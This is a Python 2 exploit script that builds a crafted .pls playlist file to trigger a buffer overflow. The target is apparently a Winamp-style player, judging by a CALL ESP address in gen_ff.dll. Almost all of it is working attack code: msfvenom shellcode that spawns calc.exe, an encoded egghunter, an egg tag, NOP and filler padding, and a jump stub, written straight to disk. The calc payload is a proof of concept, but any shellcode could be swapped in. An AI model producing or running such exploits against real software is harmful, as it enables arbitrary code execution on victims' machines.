import sys

if len(sys.argv) <= 1:
    print "Usage: python " + sys.argv[0] + " [filename]"
    exit()

filename = sys.argv[1]

# Prefix
prefix = "[playlist]\r\nFile1=\\\\"

# msfvenom -p windows/exec cmd=calc.exe -b '\x0a\x0d\x00\x2e' -v payload -f python exitfunc=thread
# Spawn calc.exe
# 220 bytes
payload =  ""
payload += "\xbb\x86\x82\xbe\xbd\xd9\xd0\xd9\x74\x24\xf4\x5e"
payload += "\x33\xc9\xb1\x31\x31\x5e\x13\x83\xee\xfc\x03\x5e"
payload += "\x89\x60\x4b\x41\x7d\xe6\xb4\xba\x7d\x87\x3d\x5f"
payload += "\x4c\x87\x5a\x2b\xfe\x37\x28\x79\xf2\xbc\x7c\x6a"
payload += "\x81\xb1\xa8\x9d\x22\x7f\x8f\x90\xb3\x2c\xf3\xb3"
payload += "\x37\x2f\x20\x14\x06\xe0\x35\x55\x4f\x1d\xb7\x07"
payload += "\x18\x69\x6a\xb8\x2d\x27\xb7\x33\x7d\xa9\xbf\xa0"
payload += "\x35\xc8\xee\x76\x4e\x93\x30\x78\x83\xaf\x78\x62"
payload += "\xc0\x8a\x33\x19\x32\x60\xc2\xcb\x0b\x89\x69\x32"
payload += "\xa4\x78\x73\x72\x02\x63\x06\x8a\x71\x1e\x11\x49"
payload += "\x08\xc4\x94\x4a\xaa\x8f\x0f\xb7\x4b\x43\xc9\x3c"
payload += "\x47\x28\x9d\x1b\x4b\xaf\x72\x10\x77\x24\x75\xf7"
payload += "\xfe\x7e\x52\xd3\x5b\x24\xfb\x42\x01\x8b\x04\x94"
payload += "\xea\x74\xa1\xde\x06\x60\xd8\xbc\x4c\x77\x6e\xbb"
payload += "\x22\x77\x70\xc4\x12\x10\x41\x4f\xfd\x67\x5e\x9a"
payload += "\xba\x88\xbc\x0f\xb6\x20\x19\xda\x7b\x2d\x9a\x30"
payload += "\xbf\x48\x19\xb1\x3f\xaf\x01\xb0\x3a\xeb\x85\x28"
payload += "\x36\x64\x60\x4f\xe5\x85\xa1\x2c\x68\x16\x29\x9d"
payload += "\x0f\x9e\xc8\xe1"

# Egghunter
# msfvenom -p generic/custom PAYLOADFILE=egghunter_debug.bin -e x86/alpha_upper -f python -v egghunt
# Size 132 bytes
egghunt =  ""
egghunt += "\x89\xe2\xdb\xc3\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a"
egghunt += "\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58"
egghunt += "\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48"
egghunt += "\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41"
egghunt += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
egghunt += "\x38\x41\x43\x4a\x4a\x49\x45\x36\x4b\x31\x48\x4a"
egghunt += "\x4b\x4f\x44\x4f\x57\x32\x31\x42\x32\x4a\x45\x52"
egghunt += "\x36\x38\x48\x4d\x56\x4e\x57\x4c\x45\x55\x30\x5a"
egghunt += "\x34\x34\x4a\x4f\x4f\x48\x46\x32\x50\x4f\x57\x34"
egghunt += "\x50\x4f\x4c\x4b\x4a\x5a\x4e\x4f\x33\x45\x4a\x4a"
egghunt += "\x4e\x4f\x34\x35\x4a\x47\x4b\x4f\x4b\x57\x41\x41"

# Egg string
egg = "ODOR"[::-1] * 2

# Use egg, use payload and generate NOP's
nop = "\x90" * (856 - len(egg + payload))
print len(nop)

# Filler
fill = "\xcc" * (166 - len(egghunt))

# Jump around
jump = "\xe3\x27\x29\x1a"                       # 1a2927e3   FFD4             CALL ESP  # gen_ff.dll
jump += "\x83\xec\x58\x83\xec\x58\xff\xe4"      # First stage payload
jump += "\x90" * 4                              # NOP padding

# Suffix
suffix = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

# Concatenate string for sending
code = prefix + egg + payload + nop + egghunt + fill + jump + suffix

f = open(filename, 'wb')
f.write(code)
f.close()
